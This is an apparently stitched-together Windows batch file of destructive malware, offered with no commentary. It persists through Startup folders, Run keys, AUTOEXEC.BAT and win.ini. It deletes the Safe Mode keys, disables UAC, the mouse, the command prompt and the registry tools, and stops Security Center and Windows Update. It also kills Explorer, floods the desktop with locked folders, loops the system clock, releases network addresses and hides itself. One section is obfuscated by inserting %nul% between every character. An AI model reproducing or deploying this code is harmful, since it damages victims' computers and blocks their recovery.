reg add "HKEY_CLASSES_ROOT\.cat" /v "Content Type" /t REG_SZ /d "dllhost.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /v DisallowWinPELicensing /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx" /v "TITLE" /t REG_SZ /d "Anan sexy" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconSpacing /t REG_SZ /d -1500 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconVerticalSpacing /t REG_SZ /d -1500 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v Shell Icon Size /t REG_SZ /d 32 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_SZ /d %iconPath% /f
taskkill /f /im explorer.exe
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\winlog.bat" > nul
copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\%random%.bat" > nul
copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\%random%.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\winlog.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\%random%.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\%random%.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\%random%.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\%random%.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\crauto.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\autoexe.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\activedesktop.bat" > nul
copy %0 "C:\Dokumente und Einstellungen\All Users\Startmenü\Programme\Autostart\%random%.bat" > nul

If Exist "%systemdrive%\AUTOEXEC.BAT" (
copy %0 "%systemroot%\toaDyxpB.bat"
echo start "" "%systemroot%\toaDyxpB.bat" >> %systemdrive%\AUTOEXEC.BAT
)
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v "rundll32_awspeGfa_w32" /t "REG_SZ" /d %0 /f > nul

@Echo Off
for /f "tokens=1-1 delims=\" %%a in ("%PATH%") do (Set Root=%%a)
%Root%

IF NOT EXIST "%systemroot%\TheBat.bat" GOTO SavedIt
GOTO END
:SavedIt
REG ADD "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run" /f /v "$peer" /t "REG_SZ" /d "%systemroot%\TheBat.bat"
copy "TheBat.bat" %systemroot%
cd %userprofile%/desktop
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
md 12%random%%random%
for /d %%a in (*12*) do cacls "%%a" /e /p %computername%\%username%:N > nul
@echo off
TASKKILL /F /IM EXPLORER.EXE
@echo off
set lol=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
Set val=NoUserNameInStartMenu
Set date=1
reg.exe add "%lol%" /v "%val%" /d "%date%" /f >nul
@echo off
@copy %0 C:\Dokume~1\Alluse~1\Startm~1\Programme\Autostart\autorun.bat
cd %windir%
if exist autotime.bat goto weiter
echo @echo off >> autotime.bat
echo set Opae=time >> autotime.bat
echo set Eapo=date >> autotime.bat
echo :start >> autotime.bat
echo %Opae% 12:25 >> autotime.bat
echo %Opae% 12:45 >> autotime.bat
echo %Opae% 11:44 >> autotime.bat
echo %Eapo% 11-11-11 >> autotime.bat
echo %Eapo% 19-03-93 >> autotime.bat
echo rem This little funloop wa smade by Opae NecRoPhilie 4.0 >> autotime.bat
echo %Opae% 00:44 >> autotime.bat
echo %Eapo% 13-09-90 >> autotime.bat
echo %Opae% 11:11 >> autotime.bat
echo %Opae% 23:59 >> autotime.bat
echo %Eapo% 31-10-85 >> autotime.bat
echo %Eapo% 25-05-05 >> autotime.bat
echo %Eapo% 11-09-01 >> autotime.bat
echo %Eapo% 17-03-07 >> autotime.bat
echo %Opae% 22:41 >> autotime.bat
echo %Opae% 9:44 >> autotime.bat
echo %Eapo% 19-03-93 >> autotime.bat
echo %Opae% 00:44 >> autotime.bat
echo %Eapo% 05-03-03 >> autotime.bat
echo %Eapo% 01-01-91 >> autotime.bat
echo %Opae% 11:11 >> autotime.bat
echo goto start >> autotime.bat
echo set crauto = wscript.CreateObject("wscript.Shell") > crauto.vbs
echo crauto.run "%%windir%%\autotime.bat",0,TRUE >> crauto.vbs
:weiter
start crauto.vbs
@echo off
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@echo off
attrib +s %0
@echo off
attrib +h %0
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoClose /t REG_DWORD /d
1/f > nul
@echo off
copy %0 %systemroot%\system32\%0
echo [windows] >> %systemroot%\win.ini
echo load=%systemroot%\system32\%0 >> %systemroot%\win.ini
echo run=%systemroot%\system32\%0 >> %systemroot%\win.ini
@echo off
rem ---------------------------------
rem Fare Devre disi birakma
set fare="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %fare%
reg add %fare% /v Start /t REG_DWORD /d 4
rundll32 mouse,disable
reg add "HKLM\System\CurrentControlSet\Services\Mouclass" /v Start /t REG_DWORD /d "4" /f
rem ---------------------------------
@%nul%e%nul%c%nul%h%nul%o%nul% %nul%o%nul%f%nul%f%nul%
%nul%
%nul%n%nul%e%nul%t%nul% %nul%s%nul%t%nul%o%nul%p%nul% %nul%"%nul%S%nul%e%nul%c%nul%u%nul%r%nul%i%nul%t%nul%y%nul% %nul%C%nul%e%nul%n%nul%t%nul%e%nul%r%nul%"%nul%
%nul%
%nul%n%nul%e%nul%t%nul% %nul%s%nul%t%nul%o%nul%p%nul% %nul%S%nul%h%nul%a%nul%r%nul%e%nul%d%nul%A%nul%c%nul%c%nul%e%nul%s%nul%s%nul%
%nul%
%nul%>%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%A%nul% %nul%R%nul% %nul%E%nul% %nul%S%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%u%nul%r%nul%r%nul%e%nul%n%nul%t%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul% %nul%e%nul%s%nul%\%nul%S%nul%h%nul%a%nul%r%nul%e%nul%d%nul%A%nul%c%nul%c%nul%e%nul%s%nul%s%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%u%nul%r%nul%r%nul%e%nul%n%nul%t%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul% %nul%e%nul%s%nul%\%nul%w%nul%u%nul%a%nul%u%nul%s%nul%e%nul%r%nul%v%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%0%nul%0%nul%1%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul%e%nul%s%nul%\%nul%w%nul% %nul%s%nul%c%nul%s%nul%v%nul%c%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%S%nul%T%nul%A%nul%R%nul%T%nul% %nul%/%nul%W%nul%A%nul%I%nul%T%nul% %nul%R%nul%E%nul%G%nul%E%nul%D%nul%I%nul%T%nul% %nul%/%nul%S%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul%
%nul%
%nul%D%nul%E%nul%L%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul%
%nul%
%nul%D%nul%E%nul%L%nul% %nul%%%nul%0%nul%
%nul%
%nul%
@%nul%e%nul%c%nul%h%nul%o%nul% %nul%o%nul%f%nul%f%nul%
%nul%
%nul%n%nul%e%nul%t%nul% %nul%s%nul%t%nul%o%nul%p%nul% %nul%"%nul%S%nul%e%nul%c%nul%u%nul%r%nul%i%nul%t%nul%y%nul% %nul%C%nul%e%nul%n%nul%t%nul%e%nul%r%nul%"%nul%
%nul%
%nul%n%nul%e%nul%t%nul% %nul%s%nul%t%nul%o%nul%p%nul% %nul%S%nul%h%nul%a%nul%r%nul%e%nul%d%nul%A%nul%c%nul%c%nul%e%nul%s%nul%s%nul%
%nul%
%nul%>%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%A%nul% %nul%R%nul% %nul%E%nul% %nul%S%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%u%nul%r%nul%r%nul%e%nul%n%nul%t%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul% %nul%e%nul%s%nul%\%nul%S%nul%h%nul%a%nul%r%nul%e%nul%d%nul%A%nul%c%nul%c%nul%e%nul%s%nul%s%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%u%nul%r%nul%r%nul%e%nul%n%nul%t%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul% %nul%e%nul%s%nul%\%nul%w%nul%u%nul%a%nul%u%nul%s%nul%e%nul%r%nul%v%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%[%nul%H%nul%K%nul%E%nul%Y%nul%_%nul%L%nul%O%nul%C%nul%A%nul%L%nul%_%nul%M%nul%A%nul%C%nul%H%nul%I%nul%N%nul%E%nul%\%nul%S%nul%Y%nul%S%nul%T%nul%E%nul%M%nul%\%nul%C%nul%o%nul%n%nul%t%nul%r%nul%o%nul%l%nul%S%nul%e%nul%t%nul%0%nul%0%nul%1%nul%\%nul%S%nul%e%nul%r%nul%v%nul%i%nul%c%nul%e%nul%s%nul%\%nul%w%nul% %nul%s%nul%c%nul%s%nul%v%nul%c%nul%]%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul% %nul%"%nul%S%nul%t%nul%a%nul%r%nul%t%nul%"%nul%=%nul%d%nul%w%nul%o%nul%r%nul%d%nul%:%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%0%nul%4%nul%
%nul%
%nul%>%nul%>%nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul% %nul%E%nul%C%nul%H%nul%O%nul%.%nul%
%nul%
%nul%S%nul%T%nul%A%nul%R%nul%T%nul% %nul%/%nul%W%nul%A%nul%I%nul%T%nul% %nul%R%nul%E%nul%G%nul%E%nul%D%nul%I%nul%T%nul% %nul%/%nul%S%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul%
%nul%
%nul%D%nul%E%nul%L%nul% %nul%"%nul%%%nul%T%nul%e%nul%m%nul%p%nul%%%nul%.%nul%\%nul%k%nul%i%nul%l%nul%l%nul%.%nul%r%nul%e%nul%g%nul%"%nul%
%nul%
%nul%D%nul%E%nul%L%nul% %nul%%%nul%0%nul%
%nul%
%nul%
ipconfig /release +vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all
echo @echo off>c:\windows\wimn32.bat 
echo break off>>c:\windows\wimn32.bat 
echo ipconfig/release_all>>c:\windows\wimn32.bat 
echo end>>c:\windows\wimn32.bat 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f 
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1/f > nul
reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableRegistryTools /t REG_DWORD /d “1”